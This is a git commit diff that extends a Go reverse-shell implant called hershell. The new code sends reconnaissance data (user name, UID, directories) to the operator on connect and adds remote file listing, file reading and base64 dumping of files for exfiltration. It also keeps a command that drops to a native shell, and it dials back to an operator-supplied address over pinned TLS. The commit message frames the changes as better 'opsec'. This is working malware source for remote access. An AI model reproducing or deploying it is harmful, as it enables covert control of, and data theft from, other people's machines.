5a520b840c56ec014346da8739bad8b736064127
Alex Flores <domain@me.com>
2018-09-07 16:58:47 -0400

    expand agent capabilities
      - remove os command execution from agent prompt
      - improve opsec by using go for file operations
      - warn users of opsec concerns when dropping to native shell
      - file cleanup

--- hershell.go
+++ hershell.go
@@ -5,13 +5,18 @@ import (
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/hex"
+	"fmt"
+	"io/ioutil"
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 	"strings"
 
-	"github.com/f47h3r/hershell/shell"
+	"./shell"
+	"code.cloudfoundry.org/bytefmt"
 )
 
 const (
@@ -25,27 +30,108 @@ var (
 	fingerPrint   string
 )
 
+func Encode(path string) (string, error) {
+	buff, err := ioutil.ReadFile(path)
+	if err != nil {
+		return "", err
+	}
+	return base64.StdEncoding.EncodeToString(buff), nil
+}
+
+func Intel(conn net.Conn) {
+	user, _ := user.Current()
+	userBlock := fmt.Sprintf("\n[User]\nusername=%s\nid=%s\n", user.Name, user.Uid)
+
+	dir, _ := os.Getwd()
+	dirBlock := fmt.Sprintf("\n[Directory]\nCurrent=%s\nHome=%s\n", dir, user.HomeDir)
+
+	conn.Write([]byte(userBlock + dirBlock))
+}
+
+// takes a network connection as its arg so it can pass stdio to it
 func InteractiveShell(conn net.Conn) {
 	var (
-		exit    bool           = false
-		prompt  string         = "[hershell]> "
+		exit    bool   = false
+		name, _        = os.Hostname()
+		prompt  string = fmt.Sprintf("[%s]> ", name)
+
+		// buffered i/o. stdin/out library
+		// TODO: why the asterisk on the scanner type declaration
 		scanner *bufio.Scanner = bufio.NewScanner(conn)
 	)
 
+	// Print basic recon data on first connect
+	Intel(conn)
+	// write the byte array that is our prompt to the net connection
 	conn.Write([]byte(prompt))
 
+	// looks like the equivalent of a while loop that listens for user
+	// input
 	for scanner.Scan() {
+		// Grab user input
 		command := scanner.Text()
+
 		if len(command) > 1 {
+			// split the user input on whitespace
 			argv := strings.Split(command, " ")
+
 			switch argv[0] {
 			case "exit":
 				exit = true
-			case "run_shell":
-				conn.Write([]byte("Enjoy your native shell\n"))
+
+			case "shell":
+				conn.Write([]byte("Mind your OPSEC\n"))
 				RunShell(conn)
+
+			case "ls":
+				files, _ := ioutil.ReadDir("./")
+
+				for _, f := range files {
+					perms := f.Mode().String()
+					size := bytefmt.ByteSize(uint64(f.Size()))
+					modTime := f.ModTime().String()[0:19]
+					name := f.Name()
+					conn.Write([]byte(perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"))
+				}
+				conn.Write([]byte("\n"))
+
+			case "cd":
+				os.Chdir(argv[1])
+				dir, _ := os.Getwd()
+				conn.Write([]byte("Directory: " + dir + "\n"))
+
+			case "pwd":
+				dir, _ := os.Getwd()
+				conn.Write([]byte(dir + "\n"))
+
+			case "cat":
+				buf, err := ioutil.ReadFile(argv[1])
+
+				if err != nil {
+					conn.Write([]byte(err.Error()))
+				} else {
+					conn.Write([]byte("\n" + string(buf) + "\n\n"))
+				}
+
+			case "base64":
+				base64, err := Encode(argv[1])
+
+				if err != nil {
+					conn.Write([]byte(err.Error()))
+				} else {
+					conn.Write([]byte("\n" + base64 + "\n\n"))
+				}
+
+			case "help":
+				conn.Write([]byte("Currently implemented commands: \n" +
+					"cd <path>     -  Change the processe's working directory\n" +
+					"ls            -  List the current working directory\n" +
+					"pwd           -  Print the current working directory\n" +
+					"cat <file>    -  Print the contents of the given file\n" +
+					"base64 <file> -  Base64 encode the given file and print\n\n"))
 			default:
-				shell.ExecuteCmd(command, conn)
+				// shell.ExecuteCmd(command, conn)
+				conn.Write([]byte("Command not implemented. Try 'help'\n"))
 			}
 
 			if exit {
@@ -53,6 +139,7 @@ func InteractiveShell(conn net.Conn) {
 			}
 
 		}
+
 		conn.Write([]byte(prompt))
 	}
 }
@@ -77,12 +164,15 @@ func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 	return valid, nil
 }
 
+// Create the TLS connection before passing it to the InteractiveShell function
 func Reverse(connectString string, fingerprint []byte) {
 	var (
 		conn *tls.Conn
 		err  error
 	)
+
 	config := &tls.Config{InsecureSkipVerify: true}
+
 	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
 		os.Exit(ERR_HOST_UNREACHABLE)
 	}
@@ -92,6 +182,7 @@ func Reverse(connectString string, fingerprint []byte) {
 	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
+
 	InteractiveShell(conn)
 }
 
